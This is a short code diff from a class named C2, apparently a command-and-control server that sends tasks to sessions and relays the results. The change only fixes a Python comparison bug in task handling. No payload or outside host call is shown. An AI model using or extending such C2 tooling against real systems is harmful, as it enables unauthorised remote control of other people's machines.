@@ -1085,7 +1085,7 @@ class C2():
             task = globals()['c2'].database.handle_task({'task': command, 'session': index})
             ses.send_task(task)
             task = ses.recv_task()
-            if task['task'] = 'prompt': # First task is to display prompt to user
+            if task['task'] == 'prompt': # First task is to display prompt to user
                 task = ses.recv_task() # Second one is the result
             conn.sendall((f"{task['result']}\n").encode("utf-8"))
 
